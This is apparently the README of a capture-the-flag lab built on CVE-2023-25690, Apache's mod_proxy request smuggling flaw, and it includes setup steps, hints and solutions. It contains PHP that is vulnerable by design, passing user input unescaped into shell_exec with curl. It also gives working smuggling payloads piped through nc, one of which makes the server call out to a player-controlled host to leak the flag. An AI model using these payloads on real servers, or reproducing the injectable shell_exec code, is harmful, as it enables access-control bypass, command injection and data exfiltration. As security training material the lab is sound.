# Apache-Tide-Surfing-the-Waves-of-Request-Ambiguity

<p align="center">
  <a href="#installation">Install</a> •
  <a href="#documentation">Usage</a> •
  <a href="#about">About</a> •
  <a href="#exploit">Exploit</a> •
  <a href="#demo">Demo</a>
</p>

# Installation
```bash
git clone https://github.com/vigneshsb403/Apache-Tide-Surfing-the-Waves-of-Request-Ambiguity.git
cd Apache-Tide-Surfing-the-Waves-of-Request-Ambiguity
docker compose build
docker compose up
```
now you can visit your `localhost` to view the site is up.

# Documentation
```
Challenge name: Apache Tide: Unraveling the HTTP Request Smuggling
Sub-Challenge 1 name: Hidden Trails: Unearthing the Forbidden
Sub-Challenge 2 name: Local Odyssey: Navigating the Depths of Localality
```
> [!NOTE]\
> The challenge name gives a overview to the player that this challenge is about request smunggling and then the sub-challenge name 1 gives a hint that the player has to acess a unotherised file. then the sub-challenge name 2 gives a hint that the player hint that they have to acess the a internal function to get the flag.

## Hints

```
Hint 1: Did you go through the commented html code?
Hint 2: Visit Robots.txt
Hint 3: check the Server header from the responce
```
the final hint gives idea to the player that this challenge is based on a CVE.
### Mission brief 1
In the mission brief of sub challenge 1 we can give a glimpse of the code:
```php
if(isset($_GET['hacked'])){
    $flag = 'TH!S_!S_1$t_FLAG';
    file_put_contents('flag.txt', $flag);
}
```
and then they can get the file using
```bash
curl --location 'http://localhost/flag/'
```
### Mission brief 2
In the mission brief of sub challenge 2 we can add that there is a part of code like:
```php
if(isset($_GET['secret'])){
    $secret = $_GET['secret'];
    shell_exec("curl --location '" . $secret . "/dontlookhere'"); // this sends the flag to players server.
}
```
which gives players the overview that they have to pass in a listening servers host or ip to get the flag.
# About
this challenge is based on CVE 2023 25690.

Some mod_proxy configurations on Apache HTTP Server versions 2.4.0 through 2.4.55 allow a HTTP Request Smuggling attack. Configurations are affected when mod_proxy is enabled along with some form of RewriteRule or ProxyPassMatch in which a non-specific pattern matches some portion of the user-supplied request-target (URL) data and is then re-inserted into the proxied request-target using variable substitution. For example, something like: RewriteEngine on RewriteRule "^/here/(.*)" "http://example.com:8080/elsewhere?$1"; [P] ProxyPassReverse /here/ http://example.com:8080/ Request splitting/smuggling could result in bypass of access controls in the proxy server, proxying unintended URLs to existing origin servers, and cache poisoning. Users are recommended to update to at least version 2.4.56 of Apache HTTP Server.

# Exploit
Sub-Challenge-1 can be solved by sending a request like:
```bash
echo "GET /categories/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/categories.php%3fhacked%3dTrue HTTP/1.1\r\nHost: hostname\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n" | nc localhost 80
```
followed by an other request:
```bash
curl --location 'http://localhost/flag/'
```
Sub-Challenge-2 can be solved by sending a request like:
```bash
echo "GET /categories/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/categories.php%3fsecret%3dplayerserver.com HTTP/1.1\r\nHost: hostname\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n" | nc hostname 80
```
why this instered of BurpSuite or any other proxy because it is hard to replicate the unicodes there.

> [!NOTE]\
> The hostname must be changed accordingly\
> The `playerserver.com` must be changed to send the request to the players server.

# Demo
[Watch the demo video](Assets/demo.mov)

